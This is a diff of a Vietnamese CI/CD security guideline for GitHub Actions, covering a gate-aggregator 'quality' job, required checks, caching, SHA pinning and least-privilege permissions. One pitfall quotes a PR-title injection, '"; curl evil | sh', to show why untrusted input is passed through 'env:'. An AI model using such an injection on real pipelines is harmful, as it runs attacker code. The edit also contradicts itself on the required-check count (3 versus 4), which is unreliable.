@@ -8,15 +8,15 @@ updated: 2026-10-14
 
 # CI/CD: job gate, required check, cache, bảo mật pipeline
 
-> Pipeline là **hàng rào tập trung** (tầng 3): một job `quality` gom mọi cổng làm required check duy nhất, chạy
+> Pipeline là **hàng rào tập trung** (tầng 3): một job `quality` gom mọi cổng chất lượng làm required check chính (cùng `protection-guard`, `gitleaks` và `dep-audit`), chạy
 > lại mọi kiểm của hook local, nhanh nhờ cache, an toàn nhờ `permissions` tối thiểu + ghim SHA + không chạy code
 > lạ với quyền ghi. Ghim SHA/SBOM/provenance chi tiết ở [`../12-security/supply-chain.md`](../12-security/supply-chain.md);
 > chiến lược deploy ở [`../15-operations/deployment-strategies.md`](../15-operations/deployment-strategies.md).
 
 ## Nguyên tắc
 
-1. **Một cổng, một tên.** Required check duy nhất `quality` (gate aggregator) phụ thuộc mọi job con; thêm job mới
-   không phải sửa ruleset; đổi tên job có guard bắt.
+1. **Một cổng chất lượng, một tên.** `quality` (gate aggregator) gom mọi job cổng; thêm job mới không phải sửa ruleset;
+   ruleset đòi đúng 4 required check `quality` · `protection-guard` · `gitleaks` · `dep-audit`, mỗi cái là job có thật; đổi tên job có guard bắt.
 2. **CI là nguồn sự thật của "xanh".** Hook local có thể bị bỏ qua; mọi lint/format/type/test/scan đều chạy lại
    ở CI với cùng lệnh (đọc từ `xs.yaml`/`package.json`, không viết lại).
 3. **Quyền tối thiểu, fail-closed.** `permissions: contents: read` cấp workflow; job cần ghi tự nâng; không
@@ -30,7 +30,7 @@ updated: 2026-10-14
 
 | Câu hỏi | Chọn | Ghi chú |
 |---|---|---|
-| Cấu trúc workflow | `ci.yml`: job con (lint, type, test, build, scan…) → job `quality` `needs: [...]` kiểm `needs.*.result == 'success'` | Nhiều required check rời = ruleset lệch tên; `quality` là tên duy nhất trong ruleset |
+| Cấu trúc workflow | `ci.yml`: job con (lint, type, test, build, scan…) → job `quality` `needs: [...]` kiểm `needs.*.result == 'success'` | Không thêm required check rời cho từng job con (ruleset lệch tên); ruleset giữ 3 tên cố định `quality`, `protection-guard`, `gitleaks`, `dep-audit` |
 | Trigger | `pull_request` + `push: branches: [main]` + `merge_group` (nếu merge queue) + `schedule` có offset phút | `pull_request_target` chỉ khi thật cần quyền và **không checkout code PR** |
 | Cache | `actions/setup-*` cache built-in theo lockfile; `actions/cache` cho browser/tool với key `hashFiles(lockfile)` | Cache theo nhánh/ngày (miss liên tục) |
 | Ghim action | Full commit SHA + comment version; Dependabot `github-actions` cập nhật | Tag `@v4` chỉ cho action chính chủ GitHub nếu chấp nhận rủi ro — ghi ADR |
@@ -40,7 +40,7 @@ updated: 2026-10-14
 
 ## Checklist
 
-- [ ] `WF-CI-001` **MUST** Có job `quality` gom (needs mọi job cổng, fail nếu bất kỳ job con không `success`), là required check **duy nhất** trong ruleset; `protection-guard` đối chiếu tên ([`git-and-branching.md`](git-and-branching.md)). → Kiểm: `.github/rulesets/main.json` chỉ có context `quality` (+ `protection-guard`); `ci.yml` có job `quality` với `if: always()` kiểm `needs`. · Nguồn: catalog 23 §2.5 (gate aggregator ADR-0003), 13 §4b
+- [ ] `WF-CI-001` **MUST** Có job `quality` gom mọi cổng chất lượng (một job luôn chạy; nếu tách job con thì `needs` mọi job cổng và fail khi bất kỳ job con không `success`). Ruleset đòi đúng 4 required check `quality` · `protection-guard` · `gitleaks` · `dep-audit`; mỗi context phải là job có thật, `protection-guard` đối chiếu tên ([`git-and-branching.md`](git-and-branching.md)). → Kiểm: `.github/rulesets/main.json` có đúng 3 context đó; `protection-guard` đỏ khi context không khớp job nào trong `.github/workflows/`; nếu tách job con, `quality` có `if: always()` kiểm `needs`. · Nguồn: catalog 23 §2.5 (gate aggregator ADR-0003), 13 §4b
 - [ ] `WF-CI-002` **MUST@L** CI chạy lại mọi kiểm của hook local (lint, format check, type, test, secret scan) bằng **cùng lệnh** từ một nguồn (`xs.yaml`/`package.json`/`Makefile`), không viết lệnh khác trong YAML. → Kiểm: diff lệnh hook ↔ CI = cùng script; `pre-commit run --all-files` hoặc `scripts/dev-task.sh gate` trong CI. · Nguồn: pre-commit docs (CI), catalog 23 §4.3 (`/gate` đọc động job CI)
 - [ ] `WF-CI-003` **MUST** `permissions:` khai báo tường minh ở cấp workflow với mặc định `contents: read`; job cần ghi (release, comment) tự nâng tối thiểu; không dùng `write-all`. → Kiểm: actionlint/zizmor không cảnh báo thiếu permissions; grep `permissions: write-all` = 0. · Nguồn: GitHub Security hardening for Actions
 - [ ] `WF-CI-004` **MUST** Không nội suy input không tin cậy (`github.event.pull_request.title/body`, branch name, issue) trực tiếp vào `run:`; đưa qua `env:` và quote; `pull_request_target`/`workflow_run` không checkout code PR. → Kiểm: zizmor `template-injection`/`dangerous-triggers` = 0 finding. · Nguồn: GitHub Security hardening (script injection)
@@ -65,7 +65,7 @@ updated: 2026-10-14
 
 ## Bẫy thường gặp
 
-- **Nhiều required check rời rạc.** Thêm/đổi tên job → ruleset lệch → nhánh khoá hoặc cổng hở. Một `quality` gom + guard.
+- **Nhiều required check rời rạc.** Thêm/đổi tên job → ruleset lệch → nhánh khoá hoặc cổng hở. Một `quality` gom + `protection-guard` đối chiếu (cộng `gitleaks`).
 - **CI "xanh rỗng".** Job skip khi chưa có `package.json` (khung cũ) hoặc `if:` sai → mọi thứ xanh mà không chạy gì. `quality` phải fail khi job con `skipped` ngoài quy tắc; smoke "cổng chặn được lỗi" ở G5.
 - **`pull_request_target` + checkout PR head.** PR từ fork chạy code lạ với secrets. Không checkout code PR trong trigger có quyền.
 - **Nội suy title PR vào `run:`.** Title `"; curl evil | sh` chạy trên runner. Qua `env:` và quote.
@@ -84,8 +84,8 @@ updated: 2026-10-14
 | actionlint (MIT) v1.7.12 | `actionlint` | pre-commit + CI | 0 lỗi |
 | zizmor (MIT) 1.30.1 | `zizmor --min-severity medium .github/workflows` | CI | 0 finding ≥ medium |
 | pinact / ratchet | `pinact run --check` | CI | 100% `uses:` ghim SHA (chi tiết [`../12-security/supply-chain.md`](../12-security/supply-chain.md)) |
-| ci-lint (tự viết) | script Python đọc YAML: permissions, continue-on-error, timeout, tên job ↔ ruleset | CI | 0 vi phạm |
-| protection-guard | API rules ↔ `.github/rulesets/main.json` ↔ tên job | CI required | Đỏ khi lệch |
+| `xs.py ci-check` | `xs.py ci-check` (đọc YAML workflow: `permissions`, ghim SHA, `timeout-minutes`, `continue-on-error`) | CI (trong `lint`) | 0 vi phạm |
+| protection-guard | job trong `ci.yml`: `required_status_checks` của `.github/rulesets/main.json` ↔ tên job thật; API rules kiểm ruleset đang áp | CI required | Đỏ khi required check không khớp job; cảnh báo khi ruleset chưa hiệu lực (đổi `::warning` thành `exit 1` để ép) |
 | Thời gian cổng | đo `quality` end-to-end | CI | < 10–15 phút, cảnh báo khi vượt |
 | Cache | `actions/setup-node@<sha>` `cache: npm` · `actions/setup-python` `cache: pip` · `actions/setup-go` | CI | Hit ratio theo dõi |
 | OIDC | `permissions: id-token: write` + provider action | CD | Không khoá dài hạn |
